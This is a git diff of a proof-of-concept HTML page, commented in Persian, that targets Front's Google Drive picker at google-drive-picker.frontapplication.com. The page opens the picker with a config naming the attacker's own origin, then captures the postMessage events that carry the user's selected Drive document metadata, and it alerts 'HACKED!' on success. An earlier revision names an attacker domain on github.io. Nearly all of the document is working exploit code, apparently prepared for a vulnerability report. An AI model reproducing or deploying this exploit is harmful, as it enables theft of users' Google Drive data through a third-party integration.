@@ -2,49 +2,46 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Front Picker PoC - FIXED</title>
+  <title>Front Picker PoC - FINAL</title>
 </head>
 <body>
-  <h2>🎯 Testing...</h2>
+  <h2>🎯 Waiting for message...</h2>
   <pre id="output" style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;"></pre>
 
   <script>
-  const ATTACKER_ORIGIN = "https://52-hrtz.github.io"; // <<< دامنه خودت رو اینجا بذار
-const PICKER_URL = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
+    // ۱. لیسنر باید قبل از هر چیزی attach بشه
+    window.addEventListener("message", (e) => {
+      console.log("📨 Raw Event:", e);
+      
+      const out = document.getElementById("output");
+      out.textContent = "✅ Message Received!\nOrigin: " + e.origin + "\n\nData:\n" + JSON.stringify(e.data, null, 2);
+      
+      if(e.data?.type === "google-documents-selected" && e.data.documents?.[0]) {
+        out.textContent += "\n\n🎉 SUCCESS! File: " + e.data.documents[0].name;
+        alert("✅ HACKED! Check console");
+      }
+    }, false);
 
-// کانفیگ حمله (تمیز، بدون فاصله اضافی، بدون authenticatedUserEmail)
-const config = {
-  googleAppId: "754490832836",
-  googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
-  googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly",
-  googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
-  origin: ATTACKER_ORIGIN
-};
+    // ۲. کانفیگ تمیز - نکته حیاتی: origin باید دقیقاً برابر با location.origin باشه (بدون فاصله)
+    const myOrigin = window.location.origin; // این یعنی "https://attacker.com" - خودکار و دقیق
+    console.log("🎯 My Origin:", myOrigin);
 
-// گوش دادن به پیام‌ها (قبل از باز کردن پاپ‌آپ)
-window.addEventListener("message", (e) => {
-  console.log("📨 [PoC] Message received!", { origin: e.origin, data: e.data });
-  if(e.data?.type === "google-documents-selected" && e.data.documents?.length) {
-    console.log("🎉 SUCCESS! File metadata:", e.data.documents[0]);
-    alert("✅ HACKED! Check console for file info");
-  }
-}, false);
+    const config = {
+      googleAppId: "754490832836",
+      googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
+      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly", // بدون فاصله
+      googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
+      origin: myOrigin // <<< استفاده از متغیر دقیق به جای تایپ دستی
+    };
 
-// باز کردن پاپ‌آپ
-console.log("🎯 Opening picker popup...");
-const popup = window.open(`${PICKER_URL}?config=${encodeURIComponent(JSON.stringify(config))}`, "picker", "width=700,height=600");
-
-// چک کردن وضعیت opener
-setTimeout(() => {
-  if(!popup || popup.closed) console.warn("❌ Popup blocked or closed");
-  else {
-    // چک کنیم opener دسترسی داره یا نه
-    try {
-      const test = popup.window?.opener;
-      console.log("🔍 window.opener in popup:", test ? "✅ Accessible" : "❌ NULL (COOP/noopener?)");
-    } catch(err) { console.warn("⚠️ Cannot access popup:", err); }
-  }
-}, 2000);
+    // ۳. باز کردن پاپ‌آپ
+    const baseUrl = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
+    const fullUrl = `${baseUrl}?config=${encodeURIComponent(JSON.stringify(config))}`;
+    
+    console.log("🔗 Opening URL:", fullUrl);
+    const popup = window.open(fullUrl, "picker", "width=700,height=600");
+    
+    if(!popup) alert("❌ Popup blocked! Please allow popups for this site.");
   </script>
 </body>
 </html>
